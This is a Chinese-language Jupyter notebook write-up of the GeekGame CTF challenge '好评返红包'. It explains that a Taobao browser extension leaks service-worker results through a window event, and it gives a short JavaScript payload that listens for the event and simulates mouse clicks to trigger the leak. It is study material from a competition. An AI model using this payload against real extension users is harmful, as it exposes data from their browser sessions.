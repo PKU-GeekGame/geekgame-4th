{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 好评返红包"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "vscode": {
     "languageId": "javascript"
    }
   },
   "source": [
    "这道题注意力集中的同学可以一眼看到淘宝的天才程序员造出的神秘通信轮子：\n",
    "\n",
    "```javascript\n",
    "function n(t) {\n",
    "    window.dispatchEvent(new CustomEvent(\"sendDataToContentScript\",{\n",
    "        detail: t\n",
    "    }))\n",
    "}\n",
    "```\n",
    "\n",
    "他们这个插件会在window上挂一个eventLister，所有通讯的结果都会通过这个eventListener从service worker传递给content script。我们要做的事情有两件：\n",
    "\n",
    "1. 让扩展访问特定的网址；(这一步可以通过造一张图片然后模拟点击时间解决)\n",
    "2. 监听sendDataToContentScript事件，获取flag。\n",
    "\n",
    "实际上的Payload很短：\n",
    "```javascript\n",
    "window.addEventListener('sendDataToContentScript', function(event ){\n",
    "    console.log(event.detail);\n",
    "    // set title\n",
    "    document.title = event.detail.message;\n",
    "})\n",
    "\n",
    "async function sleep(ms) {\n",
    "    return new Promise(resolve => setTimeout(resolve, ms));\n",
    "}\n",
    "async function main(){\n",
    "    await sleep(2300);\n",
    "    console.log('hovering on the image');\n",
    "    var ele = document.getElementById('flagImg');\n",
    "    var dim = ele.getBoundingClientRect();\n",
    "    // dispatch a event at the center of the image\n",
    "    ele.dispatchEvent(new MouseEvent('mousemove', { bubbles: true, clientX: dim.x + dim.width/2, clientY: dim.y + dim.height/2 }));\n",
    "    await sleep(100);\n",
    "    ele.dispatchEvent(new MouseEvent('mouseover', { bubbles: true, clientX: dim.x + dim.width/2, clientY: dim.y + dim.height/2 }));\n",
    "    await sleep(500);\n",
    "    console.log('clicking the button');\n",
    "    document.querySelector('[class^=\"index-module__imgSearch_hover_rightWrapper\"]').click();\n",
    "}\n",
    "main();\n",
    "```"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
